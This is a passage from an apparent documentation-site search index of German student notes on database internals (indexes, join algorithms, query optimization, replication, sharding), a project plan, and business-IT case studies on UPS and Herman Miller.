            "location": "/Dbs2/8_Interne_Ebene/#bitmap-index", 
            "text": "Speichert Attribute als Bitmuster  Nur geeignet, wenn Werte in Attribute kleinen Wertebereich haben (und diskret sind)  Wenn z.B. in einem Attribut immer nur die gleichen 2 Werte vorkommen, kann dies mit 1 Bit indexiert werden  Schnelle Abfragen mit ORs / ANDs", 
            "title": "Bitmap Index"
        }, 
        {
            "location": "/Dbs2/8_Interne_Ebene/#indexe-erstellen", 
            "text": "convention (nicht standardisiert):   CREATE   INDEX   IndexName  ON   Table ( attr ) ;    Auf PK-Attributen werden automatisch Indices erstellt    Note  TODO", 
            "title": "Indexe erstellen"
        }, 
        {
            "location": "/Dbs2/8_Interne_Ebene/#query-processing", 
            "text": "Eine Query wird geparst in einen Query-Tree  Vom Optimizer wird optimierter Ausf\u00fchrungsplan erstellt  Point Query : Suche Row mit bestimmten Wert, z.B.  where id = 1024  Multipoint Query : Suche mehrere Rows mit bestimmten Wert, z.B.  where balance = 1000  Range Query : Suche in einer Range, z.B.  where income between 100 and 1000  Order Query : Query mit  order by  Interpretation Postgres  Index wird nicht immer verwendet, vor allem wenn alle Rows durchgegangen werden (z.B.  count(*) )  Einfacher Select ist mit Index ca. 3-10x schneller", 
            "title": "Query Processing"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/", 
            "text": "Joins / Anfrageoptimierung\n\n\nJoins\n\n\nHash Join\n\n\n\n\nF\u00fcr die kleinere Tabelle des Joins wird eine in-memory Hash-Table gebaut\n\n\nWenn die Tabelle nicht im Memory Platz hat, wird sie aufgeteilt in \"buckets\"\n\n\nDie kleinere Tabelle ist hier die \"Driving Table\"\n\n\n\n\n\n\nF\u00fcr den Join wird f\u00fcr jeder Eintrag der gr\u00f6sseren Tabelle die Hash-Table abgefragt\n\n\n\n\nNested Loop Join\n\n\n\n\nGeeignet f\u00fcr kleine Relationen\n\n\nIn der einfachen Variante wird einfach \u00fcber beide Tabellen geloopt, wobei die kleinere der \"\u00e4ussere\" Loop ist\n\n\n\n\nfor (i = 0; i \n length(outer); i++)\n    for (j = 0; j \n length(inner); j++)\n        if (outer[i] == inner[j])\n            output(outer[i], inner[j]);\n\n\n\n\n\nBlock based Nested-Loop Join\n\n\n\n\nOptimierte Version des Nested Loop Joins\n\n\nRelationen werden nicht direkt row-by-row verglichen, sondern in Bl\u00f6cken\n\n\nIn jedem Blockvergleich wird wieder gleich wie oben Row-by-row verglichen\n\n\nWeitere Optimierung, wenn Indexe verwendet werden\n\n\n\n\nSort-Merge Join\n\n\n\n\nBeide Relationen werden auf der Join-Column sortiert\n\n\nDurch die \u00e4ussere Relation (kleinere) wird 1x iteriert\n\n\nTODO: Algorithmus verstehen\n\n\n\n\nWahl des Join Algorithmus\n\n\n\n\nFalls kein Index existiert: In der Regel Hash Join\n\n\nMit Index ist ein Nested Loop schneller bei FK-Joins\n\n\nM\u00f6glichst Indexe verwenden, vor allem f\u00fcr grosse Tabellen\n\n\n\n\nAnfrage Optimierung\n\n\nLogische Optimierung\n\n\n\n\nUmformung des Anfrageterms aufgrund von Heuristiken\n\n\nNimmt keine R\u00fccksicht auf das interne Schema oder die Gr\u00f6sse der Relationen\n\n\nin der ersten Phase wird die Query in relationale Algebra \u00fcbersetzt\n\n\nSelektionen so fr\u00fch wie m\u00f6glich, um Resultatmenge zu verringern\n\n\nz.B. Filter auf eine Tabelle vor dem Join anwenden\n\n\n\n\n\n\nBasisoperationen ohne Zwischenspeicherung als einen Schritt ausf\u00fchren\n\n\nZusammenfassen gleicher Teilausdr\u00fccke f\u00fcr Wiederverwendung von Zwischenergebnissen\n\n\n\n\nPhysische Optimierung\n\n\n\n\nErzeugung von Ausf\u00fchrungspl\u00e4nen\n\n\n\n\nKostenbasierte Optimierung\n\n\n\n\nGeneriere \nalle\n denkbaren Ausf\u00fchrungspl\u00e4ne\n\n\nBewerte diese durch Kosten und f\u00fchre den \"billigsten\" Plan aus\n\n\nKosten werden berechnet aus Menge der zu \u00fcbertragenen Daten, Berechnungskosten, I/O-Kosten und Speicherungskosten (tempor\u00e4re Speicherbelegung)\n\n\n\n\nStatistiken\n\n\n\n\nInformationen \u00fcber Relationen und Indexe werden aus dem System-Katalog gelesen\n\n\nz.B. Kardinalit\u00e4t, Anzahl Pages, Index-Gr\u00f6sse, etc.\n\n\n\n\nSelektivit\u00e4t\n\n\n\n\nEs wird abgesch\u00e4tzt, wieviele Rows der Gesamtmenge die Condition f\u00fcr die Filterung erf\u00fcllen\n\n\nH\u00f6here Selektivit\u00e4t = Mehr wird rausgefiltert\n\n\nOptimizer nimmt f\u00fcr hohe Selektivit\u00e4t eher Index, f\u00fcr tiefe Selektivit\u00e4t Table Scan\n\n\n\n\nDichte\n\n\n\n\nDurchschnittlicher prozentualer Anteil von Duplikaten\n\n\nals Funktion: Anzahl eindeutige Werte / Anzahl Tupels\n\n\nHohe Dichte -\n Viele Duplikate\n\n\n\n\nBest Practices\n\n\n\n\nNur Indexe erstellen, die oft verwendet werden\n\n\nIndexe auf Prim\u00e4r-, Fremdschl\u00fcssel und Attribute, auf denen h\u00e4ufig Queries ausgef\u00fchrt werden\n\n\n\n\n\n\nInfo\n\n\nTODO: SARG-able Queries", 
            "title": "9 Optimierung"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#joins-anfrageoptimierung", 
            "text": "", 
            "title": "Joins / Anfrageoptimierung"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#joins", 
            "text": "", 
            "title": "Joins"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#hash-join", 
            "text": "F\u00fcr die kleinere Tabelle des Joins wird eine in-memory Hash-Table gebaut  Wenn die Tabelle nicht im Memory Platz hat, wird sie aufgeteilt in \"buckets\"  Die kleinere Tabelle ist hier die \"Driving Table\"    F\u00fcr den Join wird f\u00fcr jeder Eintrag der gr\u00f6sseren Tabelle die Hash-Table abgefragt", 
            "title": "Hash Join"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#nested-loop-join", 
            "text": "Geeignet f\u00fcr kleine Relationen  In der einfachen Variante wird einfach \u00fcber beide Tabellen geloopt, wobei die kleinere der \"\u00e4ussere\" Loop ist   for (i = 0; i   length(outer); i++)\n    for (j = 0; j   length(inner); j++)\n        if (outer[i] == inner[j])\n            output(outer[i], inner[j]);", 
            "title": "Nested Loop Join"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#block-based-nested-loop-join", 
            "text": "Optimierte Version des Nested Loop Joins  Relationen werden nicht direkt row-by-row verglichen, sondern in Bl\u00f6cken  In jedem Blockvergleich wird wieder gleich wie oben Row-by-row verglichen  Weitere Optimierung, wenn Indexe verwendet werden", 
            "title": "Block based Nested-Loop Join"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#sort-merge-join", 
            "text": "Beide Relationen werden auf der Join-Column sortiert  Durch die \u00e4ussere Relation (kleinere) wird 1x iteriert  TODO: Algorithmus verstehen", 
            "title": "Sort-Merge Join"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#wahl-des-join-algorithmus", 
            "text": "Falls kein Index existiert: In der Regel Hash Join  Mit Index ist ein Nested Loop schneller bei FK-Joins  M\u00f6glichst Indexe verwenden, vor allem f\u00fcr grosse Tabellen", 
            "title": "Wahl des Join Algorithmus"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#anfrage-optimierung", 
            "text": "", 
            "title": "Anfrage Optimierung"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#logische-optimierung", 
            "text": "Umformung des Anfrageterms aufgrund von Heuristiken  Nimmt keine R\u00fccksicht auf das interne Schema oder die Gr\u00f6sse der Relationen  in der ersten Phase wird die Query in relationale Algebra \u00fcbersetzt  Selektionen so fr\u00fch wie m\u00f6glich, um Resultatmenge zu verringern  z.B. Filter auf eine Tabelle vor dem Join anwenden    Basisoperationen ohne Zwischenspeicherung als einen Schritt ausf\u00fchren  Zusammenfassen gleicher Teilausdr\u00fccke f\u00fcr Wiederverwendung von Zwischenergebnissen", 
            "title": "Logische Optimierung"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#physische-optimierung", 
            "text": "Erzeugung von Ausf\u00fchrungspl\u00e4nen", 
            "title": "Physische Optimierung"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#kostenbasierte-optimierung", 
            "text": "Generiere  alle  denkbaren Ausf\u00fchrungspl\u00e4ne  Bewerte diese durch Kosten und f\u00fchre den \"billigsten\" Plan aus  Kosten werden berechnet aus Menge der zu \u00fcbertragenen Daten, Berechnungskosten, I/O-Kosten und Speicherungskosten (tempor\u00e4re Speicherbelegung)", 
            "title": "Kostenbasierte Optimierung"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#statistiken", 
            "text": "Informationen \u00fcber Relationen und Indexe werden aus dem System-Katalog gelesen  z.B. Kardinalit\u00e4t, Anzahl Pages, Index-Gr\u00f6sse, etc.", 
            "title": "Statistiken"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#selektivitat", 
            "text": "Es wird abgesch\u00e4tzt, wieviele Rows der Gesamtmenge die Condition f\u00fcr die Filterung erf\u00fcllen  H\u00f6here Selektivit\u00e4t = Mehr wird rausgefiltert  Optimizer nimmt f\u00fcr hohe Selektivit\u00e4t eher Index, f\u00fcr tiefe Selektivit\u00e4t Table Scan", 
            "title": "Selektivit\u00e4t"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#dichte", 
            "text": "Durchschnittlicher prozentualer Anteil von Duplikaten  als Funktion: Anzahl eindeutige Werte / Anzahl Tupels  Hohe Dichte -  Viele Duplikate", 
            "title": "Dichte"
        }, 
        {
            "location": "/Dbs2/9_Optimierung/#best-practices", 
            "text": "Nur Indexe erstellen, die oft verwendet werden  Indexe auf Prim\u00e4r-, Fremdschl\u00fcssel und Attribute, auf denen h\u00e4ufig Queries ausgef\u00fchrt werden    Info  TODO: SARG-able Queries", 
            "title": "Best Practices"
        }, 
        {
            "location": "/Dbs2/Replikation/", 
            "text": "Replikation\n\n\nAnwendungen\n\n\n\n\nLoad-Balancing\n\n\nCluster, schnelle Verbindungen\n\n\n\n\n\n\nDistributed geographic Data processing\n\n\nauf verschiedene Standorte verteilt Peer-to-Peer\n\n\nMittelschnelle Verbindung, hohe Verf\u00fcgbarkeit\n\n\n\n\n\n\nReal Time OLAP\n\n\n(Online Analytical Processing)\n\n\nReplikation auf einen Slave, z.B. als Data Warehouse\n\n\n\n\n\n\nWarm Standby\n\n\nMaster-Slave\n\n\nSchnelle, hochverf\u00fcgbare Verbindung\n\n\n\n\n\n\nMobile Datenbanken\n\n\nBei jedem Client liegt eine Kopie der n\u00f6tigen Daten, die mit dem zentralen \"Master\" repliziert werden\n\n\nClients k\u00f6nnen auch offline sein oder langsame Verbindungen haben\n\n\n\n\n\n\n\n\nMotivation\n\n\n\n\nHohe Verf\u00fcgarkeit durch Verteilung auf mehrere Nodes\n\n\nNiedrige Kommunikationskosten\n\n\nLastverteilung, dadurch skalierbar\n\n\nVorbeugung gegen Datenverlust\n\n\nClient k\u00f6nnen disconnected sein (Mobile Databases)\n\n\n\n\nKorrektheit\n\n\n\n\nLeser sollten eine m\u00f6glichst konsistente Kopie der Daten erhalten\n\n\nWeak Consistency\n: Version, die der Leser erh\u00e4lt, muss nicht die aktuellste sein\n\n\nGibt evtl. parallele \u00c4nderungen, Konflikt-Behebung nachtr\u00e4glich\n\n\nAsynchrone Replikation\n\n\nHohe Performance\n\n\nHohe Verf\u00fcgbarkeit (wenig overhead) und Fehlertoleranz\n\n\n\n\n\n\nStrong Consistency\n: Jeder Zugriff liefert neustes transaktionskonsistente Version der Daten\n\n\nSynchrone Replikation\n\n\nBenutzt das 2PC-Protokoll, dadurch grosser Overhead\n\n\nWeniger Fehlertoleranz und Verf\u00fcgbarkeit\n\n\n\n\n\n\n\n\nReplikationsarten\n\n\nMaster Slave\n\n\n\n\nUpdates geschehen immer auf dem Primary Node\n\n\nAlle Updates werden zu Read-only-Subscribers (Slaves) propagiert\n\n\nAusfall eines Knotens f\u00fchrt zum Ausfall des ganzen Systems!!\n\n\n\n\nSynchrone Replikation (eager)\n\n\n\n\nWenn auf Master eine Transaktion ausgef\u00fchrt wird, wird sie sofort mit 2PC zu den Slaves repliziert\n\n\nDie Daten werden repliziert, \nbevor\n das OK zur\u00fcck zur Applikation geschickt wird\n\n\nSo sind die Daten immer konsistent\n\n\n\n\nAsynchrone Replikation (lazy)\n\n\n\n\nDie Transaktion wird zuerst vom Master abgeschlossen\n\n\nErst anschliessend werden die Slaves asynchron aktualisiert\n\n\nDadurch k\u00f6nnen Konflikte auftreten\n\n\nH\u00f6here Verf\u00fcgbarkeit\n\n\n\u00c4nderungen bei Master werden effizienterweise im Log-File erkannt und \u00c4nderungen daraus abgeleitet\n\n\nAlternative: Jedes Update feuert einen Trigger auf dem Master\n\n\n\n\n\n\n\n\nMulti-Master\n\n\n\n\nJeder Master kann Update-Operationen ausf\u00fchren\n\n\nKomplexe Synchronisation, asynchrone Replikation\n\n\nKonflikte, wenn parallele \u00c4nderungen an verschiedenen Nodes ausgef\u00fchrt werden\n\n\nTypische Anwendung in HPC\n\n\n\n\nSynchronisationsprotokolle\n\n\n\n\nRead-One, Write-All\n: Schreibzugriffe werden synchron repliziert, Lesezugriffe asynchron\n\n\nMajority Protocol\n: Lesen und Schreiben verlangt Locks auf einer \nMehrheit\n der Replikaten\n\n\nJedes Replikat kann ein Write-Lock und mehrere Read-Locks haben\n\n\nBraucht mehr als 2 Knoten\n\n\n\n\n\n\nQuorum Consesus Protocol\n\n\nVerallgemeinerung vom Majority Protocol\n\n\nJede Kopie enth\u00e4lt bestimmte Anzahl von Stimmen\n\n\nLesen und Schreiben erfordert je eine bestimmte Anzahl Stimmen\n\n\n\n\n\n\nSnapshot-Replikation\n: Einfacheres Verfahren mit schw\u00e4cheren Konsistenzanforderungen\n\n\nMerge Replikation\n: Unsychronisierte \u00c4nderungen an mehreren Knoten, mit asynchroner Prograpierung der \u00c4nderungen\n\n\nBen\u00f6tigt f\u00fcr disconnected clients\n\n\nNachtr\u00e4gliche Konfliktbehandlung\n\n\n\n\n\n\n\n\n\n\nNote\n\n\nTODO\n\n\n\n\nSharding\n\n\n\n\nHorizontale Skalierung, also Verteilung der Daten auf mehrere Nodes\n\n\nCollections werden in Shards aufgeteilt, z.B. nach Wertebereich des Keys oder mit einer Hash-Funktion\n\n\nDabei ist ein document immer vollst\u00e4ndig in einem Shard\n\n\n\n\n\n\nRequests werden von \nmongos\n, einem Query-Router, zum richtigen Shard geleitet\n\n\nDer Query-Router entscheidet mit Hilfe von Config servers, wo welche Daten liegen", 
            "title": "Replikation"
        }, 
        {
            "location": "/Dbs2/Replikation/#replikation", 
            "text": "", 
            "title": "Replikation"
        }, 
        {
            "location": "/Dbs2/Replikation/#anwendungen", 
            "text": "Load-Balancing  Cluster, schnelle Verbindungen    Distributed geographic Data processing  auf verschiedene Standorte verteilt Peer-to-Peer  Mittelschnelle Verbindung, hohe Verf\u00fcgbarkeit    Real Time OLAP  (Online Analytical Processing)  Replikation auf einen Slave, z.B. als Data Warehouse    Warm Standby  Master-Slave  Schnelle, hochverf\u00fcgbare Verbindung    Mobile Datenbanken  Bei jedem Client liegt eine Kopie der n\u00f6tigen Daten, die mit dem zentralen \"Master\" repliziert werden  Clients k\u00f6nnen auch offline sein oder langsame Verbindungen haben", 
            "title": "Anwendungen"
        }, 
        {
            "location": "/Dbs2/Replikation/#motivation", 
            "text": "Hohe Verf\u00fcgarkeit durch Verteilung auf mehrere Nodes  Niedrige Kommunikationskosten  Lastverteilung, dadurch skalierbar  Vorbeugung gegen Datenverlust  Client k\u00f6nnen disconnected sein (Mobile Databases)", 
            "title": "Motivation"
        }, 
        {
            "location": "/Dbs2/Replikation/#korrektheit", 
            "text": "Leser sollten eine m\u00f6glichst konsistente Kopie der Daten erhalten  Weak Consistency : Version, die der Leser erh\u00e4lt, muss nicht die aktuellste sein  Gibt evtl. parallele \u00c4nderungen, Konflikt-Behebung nachtr\u00e4glich  Asynchrone Replikation  Hohe Performance  Hohe Verf\u00fcgbarkeit (wenig overhead) und Fehlertoleranz    Strong Consistency : Jeder Zugriff liefert neustes transaktionskonsistente Version der Daten  Synchrone Replikation  Benutzt das 2PC-Protokoll, dadurch grosser Overhead  Weniger Fehlertoleranz und Verf\u00fcgbarkeit", 
            "title": "Korrektheit"
        }, 
        {
            "location": "/Dbs2/Replikation/#replikationsarten", 
            "text": "", 
            "title": "Replikationsarten"
        }, 
        {
            "location": "/Dbs2/Replikation/#master-slave", 
            "text": "Updates geschehen immer auf dem Primary Node  Alle Updates werden zu Read-only-Subscribers (Slaves) propagiert  Ausfall eines Knotens f\u00fchrt zum Ausfall des ganzen Systems!!", 
            "title": "Master Slave"
        }, 
        {
            "location": "/Dbs2/Replikation/#synchrone-replikation-eager", 
            "text": "Wenn auf Master eine Transaktion ausgef\u00fchrt wird, wird sie sofort mit 2PC zu den Slaves repliziert  Die Daten werden repliziert,  bevor  das OK zur\u00fcck zur Applikation geschickt wird  So sind die Daten immer konsistent", 
            "title": "Synchrone Replikation (eager)"
        }, 
        {
            "location": "/Dbs2/Replikation/#asynchrone-replikation-lazy", 
            "text": "Die Transaktion wird zuerst vom Master abgeschlossen  Erst anschliessend werden die Slaves asynchron aktualisiert  Dadurch k\u00f6nnen Konflikte auftreten  H\u00f6here Verf\u00fcgbarkeit  \u00c4nderungen bei Master werden effizienterweise im Log-File erkannt und \u00c4nderungen daraus abgeleitet  Alternative: Jedes Update feuert einen Trigger auf dem Master", 
            "title": "Asynchrone Replikation (lazy)"
        }, 
        {
            "location": "/Dbs2/Replikation/#multi-master", 
            "text": "Jeder Master kann Update-Operationen ausf\u00fchren  Komplexe Synchronisation, asynchrone Replikation  Konflikte, wenn parallele \u00c4nderungen an verschiedenen Nodes ausgef\u00fchrt werden  Typische Anwendung in HPC", 
            "title": "Multi-Master"
        }, 
        {
            "location": "/Dbs2/Replikation/#synchronisationsprotokolle", 
            "text": "Read-One, Write-All : Schreibzugriffe werden synchron repliziert, Lesezugriffe asynchron  Majority Protocol : Lesen und Schreiben verlangt Locks auf einer  Mehrheit  der Replikaten  Jedes Replikat kann ein Write-Lock und mehrere Read-Locks haben  Braucht mehr als 2 Knoten    Quorum Consesus Protocol  Verallgemeinerung vom Majority Protocol  Jede Kopie enth\u00e4lt bestimmte Anzahl von Stimmen  Lesen und Schreiben erfordert je eine bestimmte Anzahl Stimmen    Snapshot-Replikation : Einfacheres Verfahren mit schw\u00e4cheren Konsistenzanforderungen  Merge Replikation : Unsychronisierte \u00c4nderungen an mehreren Knoten, mit asynchroner Prograpierung der \u00c4nderungen  Ben\u00f6tigt f\u00fcr disconnected clients  Nachtr\u00e4gliche Konfliktbehandlung      Note  TODO", 
            "title": "Synchronisationsprotokolle"
        }, 
        {
            "location": "/Dbs2/Replikation/#sharding", 
            "text": "Horizontale Skalierung, also Verteilung der Daten auf mehrere Nodes  Collections werden in Shards aufgeteilt, z.B. nach Wertebereich des Keys oder mit einer Hash-Funktion  Dabei ist ein document immer vollst\u00e4ndig in einem Shard    Requests werden von  mongos , einem Query-Router, zum richtigen Shard geleitet  Der Query-Router entscheidet mit Hilfe von Config servers, wo welche Daten liegen", 
            "title": "Sharding"
        }, 
        {
            "location": "/EPJ/0_Index/", 
            "text": "Engineering-Projekt\n\n\n\n\nProjektplan", 
            "title": "0 Index"
        }, 
        {
            "location": "/EPJ/0_Index/#engineering-projekt", 
            "text": "Projektplan", 
            "title": "Engineering-Projekt"
        }, 
        {
            "location": "/EPJ/1_Projektplan/", 
            "text": "Projektplanung\n\n\nMilestones\n\n\n\n\n(Projektplan)\n\n\nAnalyse / Domain Model / Use Cases\n\n\nEnd of Elaboration\n\n\nServer-Logik (nach 1. Construction Iteration)\n\n\nUsability Testing beginnnen (nach 2 construction iteration)\n\n\nFeature Freeze\n\n\n(Code Freeze) - End of Construction\n\n\n\n\nProjektplan\n\n\n\n\nabgemachte Code Reviews?\n\n\nTesting Metriken?\n\n\n\n\nArbeitspakete\n\n\n\n\nMaximale Zeitaufwand festlegen (10h?)\n\n\nZeit pro Arbeitspaket sch\u00e4tzen / Prio setzen\n\n\nEinteilung in kategorien und Milestones\n\n\n\n\nN\u00e4chste Arbeitspakete \n\n- Recherche Framework\n- Auswertung Zeit von Gitlab\n- Technologie festlegen\n- Requirements definieren\n- NF-Requirements definieren\n- Use Cases brief\n- Wichtigste Use Cases casual\n- Domain Modell erstellen\n- Architektur festlegen\n\n\nWeitere f\u00fcr Elaboration-Phase:\n- Build-Toolchain einrichten (Gitlab CI)\n- Static Code analysis? \n- UI-Prototypen\n- Backend-Prototypen mit Architektur, Datenbank und minimaler Logik", 
            "title": "1 Projektplan"
        }, 
        {
            "location": "/EPJ/1_Projektplan/#projektplanung", 
            "text": "", 
            "title": "Projektplanung"
        }, 
        {
            "location": "/EPJ/1_Projektplan/#milestones", 
            "text": "(Projektplan)  Analyse / Domain Model / Use Cases  End of Elaboration  Server-Logik (nach 1. Construction Iteration)  Usability Testing beginnnen (nach 2 construction iteration)  Feature Freeze  (Code Freeze) - End of Construction", 
            "title": "Milestones"
        }, 
        {
            "location": "/EPJ/1_Projektplan/#projektplan", 
            "text": "abgemachte Code Reviews?  Testing Metriken?", 
            "title": "Projektplan"
        }, 
        {
            "location": "/EPJ/1_Projektplan/#arbeitspakete", 
            "text": "Maximale Zeitaufwand festlegen (10h?)  Zeit pro Arbeitspaket sch\u00e4tzen / Prio setzen  Einteilung in kategorien und Milestones   N\u00e4chste Arbeitspakete  \n- Recherche Framework\n- Auswertung Zeit von Gitlab\n- Technologie festlegen\n- Requirements definieren\n- NF-Requirements definieren\n- Use Cases brief\n- Wichtigste Use Cases casual\n- Domain Modell erstellen\n- Architektur festlegen  Weitere f\u00fcr Elaboration-Phase:\n- Build-Toolchain einrichten (Gitlab CI)\n- Static Code analysis? \n- UI-Prototypen\n- Backend-Prototypen mit Architektur, Datenbank und minimaler Logik", 
            "title": "Arbeitspakete"
        }, 
        {
            "location": "/ITBus/0_Index/", 
            "text": "Wirtschaftsinformatik 1 - IT im Business\n\n\n\n\nExam Notes\n\n\nInformationssysteme", 
            "title": "0 Index"
        }, 
        {
            "location": "/ITBus/0_Index/#wirtschaftsinformatik-1-it-im-business", 
            "text": "Exam Notes  Informationssysteme", 
            "title": "Wirtschaftsinformatik 1 - IT im Business"
        }, 
        {
            "location": "/ITBus/1_Exam/", 
            "text": "Exam\n\n\n\n\nTestatbedingungen\n\n\nAnwesenheit Gastvortr\u00e4ge 04.05 und 18.05\n\n\n\n\n\n\nGastreferate sind auch Pr\u00fcfungsstoff!", 
            "title": "1 Exam"
        }, 
        {
            "location": "/ITBus/1_Exam/#exam", 
            "text": "Testatbedingungen  Anwesenheit Gastvortr\u00e4ge 04.05 und 18.05    Gastreferate sind auch Pr\u00fcfungsstoff!", 
            "title": "Exam"
        }, 
        {
            "location": "/ITBus/2_Informationssysteme/", 
            "text": "Informationssysteme\n\n\nMotivation\n\n\n\n\nAlle Mitarbeiter sollten Kenntnisse \u00fcber Informationssysteme in einem Unternehmen haben\n\n\nGesch\u00e4ftsprozesse neu organisieren\n\n\nWeit entfernte Standorte erreichen\n\n\n\n\nGlobalisierung\n\n\n\n\nWettbewerb auf Weltm\u00e4rkten\n\n\nGlobale Arbeitsgruppen und Liefersysteme\n\n\nDienstleistungs-Sektor hat heute Grossteil der Erwerbst\u00e4tigen\n\n\nWissen wird zur zentralen produktiven und strategischen Ressource\n\n\nVariantenmanagement (Kunden wird viel M\u00f6glichkeit zur Konfiguration geboten)\n\n\nHoher Qualifizierungsbedarf der Mitarbeiter\n\n\nWandel der Unternehmen\n\n\nFlacher Struktur, \"middle management\" wird weniger wichtig\n\n\nJeder einzelne mit mehr Verantwortung\n\n\n\n\n\n\n\n\nFall-Studie UPS\n\n\n\n\n\n\nMit welchen ICT-Technologien unterst\u00fctzt UPS den Distributionsprozess?\n- Statistische Auswertung\n\n\n\n\nz.B. Realtime Berechnung der Lieferungsrouten und ad-hoc \u00c4nderungen\n\n\n\n\n\n\n\n\nBetrachten Sie das Beispiel \u201eTrack \n Trace\". Noch bis im Jahre 2003 ging es auch ohne Track \n Trace. Welche Bedeutung hat diese Innovation f\u00fcr die Kleinkunden von UPS? Und f\u00fcr die Firmenkunden von UPS? Und f\u00fcr UPS selber?\n\n\n\n\n\n\n\n\nF\u00fcr Kleinkunden: Immediate Feedback; Man sieht transparent, wo das Paket ist. F\u00fchrt zu weniger Supportanfragen\n\n\nF\u00fcr Firmenkunden: Weitergabe einer Lieferzeit an Endkunden; Lieferzeit voraussehbar, z.B. f\u00fcr Just-in-time production\n\n\nF\u00fcr UPS selber: Weniger Supportanfragen von Kunden\n\n\n\n\n\n\n\n\nWorin bestehen die Eingaben, die Verarbeitung und die Ausgaben des Paketverfolgungssystems von UPS?\n\n\n\n\n\n\nWelche Arten von Dienstleistungen stellt die Website f\u00fcr Privatpersonen, f\u00fcr kleine und f\u00fcr grosse Unternehmen zur Verf\u00fcgung? F\u00fchren Sie die Serviceleistungen auf und beschreiben Sie jede in einigen Abs\u00e4tzen, z. B. UPS CampusShip oder UPS Ocean Freight. Erl\u00e4utern Sie, wie Sie bzw. Ihre Unternehmung von diesem Service profitieren k\u00f6nnten.\n\n\n\n\n\n\n\n\nCampusShip\n\n\nF\u00fcr Firmen mit mehreren grossen Standorte\n\n\nInterner Versand mit Kontrolle\n\n\n\n\n\n\nGlobalView\n\n\nEinfacherer Versand f\u00fcr Kunden\n\n\n\n\n\n\nWorldShip\n\n\nViele Pakete b\u00fcndeln und verzollen, im Zielland verteilen\n\n\n\n\n\n\nOceanFreight\n\n\nVerwaltung Versand von Container mit aller Logistik dahinter\n\n\n\n\n\n\n\n\n\n\nWie zahlen sich die Techniken f\u00fcr das Unternehmen aus? Was gesch\u00e4he, wenn diese Techniken nicht verf\u00fcgbar w\u00e4ren?\n\n\n\n\nFall-Studie Herman Miller\n\n\n\n\nBeurteilen Sie, welche Rolle Informationssysteme in der Gesch\u00e4ftst\u00e4tigkeit von Herman Miller spielen?\n- Durch zAxis grosse Rolle\n\n\nIn welcher Weise hat z-Axis zur Wertsch\u00f6pfung von Herman Miller beigetragen?\n- F\u00fcr Kunden kann viel schneller ein Vorschlag gebracht werden\n- Der Kunde kann den Vorschlag in 3D ansehen\n- zAxis wird den H\u00e4ndler weitergegeben, was sie zu ihnen bindet\n\n\nKonnte sich Herman Miller durch z-Axis einen Wettbewerbsvorteil verschaffen?\n- Integration zAxis mit dem Fertigungsprozess\n- Schnellere Bedienung der Kundenw\u00fcnsche\n\n\nSollte Herman Miller weiterhin in z-Axis investieren? Nennen Sie Gr\u00fcnde, die daf\u00fcr oder dagegen sprechen.\n- Nicht unbedingt\n- Es gibt andere Software, die weiter entwickelt ist\n- Wechsel k\u00f6nnte g\u00fcnstiger sein als Weiterentwicklung\n\n\nWelche Managementprobleme finden Sie in dieser Fallstudie?\n- Problem online-shop\n\n\nSie umgingen ihre eigenen H\u00e4ndler", 
            "title": "2 Informationssysteme"
        }, 
        {
            "location": "/ITBus/2_Informationssysteme/#informationssysteme", 
            "text": "", 
            "title": "Informationssysteme"
        }, 
        {
            "location": "/ITBus/2_Informationssysteme/#motivation", 
            "text": "Alle Mitarbeiter sollten Kenntnisse \u00fcber Informationssysteme in einem Unternehmen haben  Gesch\u00e4ftsprozesse neu organisieren  Weit entfernte Standorte erreichen", 
            "title": "Motivation"
        }, 
        {
            "location": "/ITBus/2_Informationssysteme/#globalisierung", 
            "text": "Wettbewerb auf Weltm\u00e4rkten  Globale Arbeitsgruppen und Liefersysteme  Dienstleistungs-Sektor hat heute Grossteil der Erwerbst\u00e4tigen  Wissen wird zur zentralen produktiven und strategischen Ressource  Variantenmanagement (Kunden wird viel M\u00f6glichkeit zur Konfiguration geboten)  Hoher Qualifizierungsbedarf der Mitarbeiter  Wandel der Unternehmen  Flacher Struktur, \"middle management\" wird weniger wichtig  Jeder einzelne mit mehr Verantwortung", 
            "title": "Globalisierung"
        }, 
        {
            "location": "/ITBus/2_Informationssysteme/#fall-studie-ups", 
            "text": "Mit welchen ICT-Technologien unterst\u00fctzt UPS den Distributionsprozess?\n- Statistische Auswertung   z.B. Realtime Berechnung der Lieferungsrouten und ad-hoc \u00c4nderungen     Betrachten Sie das Beispiel \u201eTrack   Trace\". Noch bis im Jahre 2003 ging es auch ohne Track   Trace. Welche Bedeutung hat diese Innovation f\u00fcr die Kleinkunden von UPS? Und f\u00fcr die Firmenkunden von UPS? Und f\u00fcr UPS selber?     F\u00fcr Kleinkunden: Immediate Feedback; Man sieht transparent, wo das Paket ist. F\u00fchrt zu weniger Supportanfragen  F\u00fcr Firmenkunden: Weitergabe einer Lieferzeit an Endkunden; Lieferzeit voraussehbar, z.B. f\u00fcr Just-in-time production  F\u00fcr UPS selber: Weniger Supportanfragen von Kunden     Worin bestehen die Eingaben, die Verarbeitung und die Ausgaben des Paketverfolgungssystems von UPS?    Welche Arten von Dienstleistungen stellt die Website f\u00fcr Privatpersonen, f\u00fcr kleine und f\u00fcr grosse Unternehmen zur Verf\u00fcgung? F\u00fchren Sie die Serviceleistungen auf und beschreiben Sie jede in einigen Abs\u00e4tzen, z. B. UPS CampusShip oder UPS Ocean Freight. Erl\u00e4utern Sie, wie Sie bzw. Ihre Unternehmung von diesem Service profitieren k\u00f6nnten.     CampusShip  F\u00fcr Firmen mit mehreren grossen Standorte  Interner Versand mit Kontrolle    GlobalView  Einfacherer Versand f\u00fcr Kunden    WorldShip  Viele Pakete b\u00fcndeln und verzollen, im Zielland verteilen    OceanFreight  Verwaltung Versand von Container mit aller Logistik dahinter      Wie zahlen 